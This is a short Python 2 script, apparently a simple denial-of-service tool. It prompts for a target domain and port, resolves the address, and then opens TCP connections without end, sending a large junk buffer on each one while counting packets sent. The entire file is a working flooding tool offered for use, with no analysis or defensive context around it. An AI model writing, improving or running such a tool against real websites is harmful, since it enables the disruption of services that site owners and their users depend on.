import sys
from socket import *

end = '\033[0m'
yellow = '\033[33m'
red="\033[0;31m"
green="\033[0;32m"
brown="\033[0;33m"
blue="\033[0;34m"
pur="\033[0;35m" 

def __start__():
	buffer = "01110101100101001"*2000
	num = 0
	print
	print green+"[-] Please enter domain website"
	print "    e.x: example.com"+end
	print
	domain = raw_input(brown+'dos > domain >>> '+end)
	print
	print green+"[-] Please enter port domain"
	print "    e.x: 80"+end
	print
	PORT = input(brown+'dos > port >>> '+end)
	try:
		IP = gethostbyname(domain)
	except:
		print
		print red+"[-] Not found domain: ",domain,end
		print
		sys.exit()
	while True:
		num = num+1
		s = socket(AF_INET, SOCK_STREAM)
		s.connect((IP, PORT))
		s.send(buffer)
		s.close()
		print green+"[*] Packet Send: {} !{}".format(num, end)



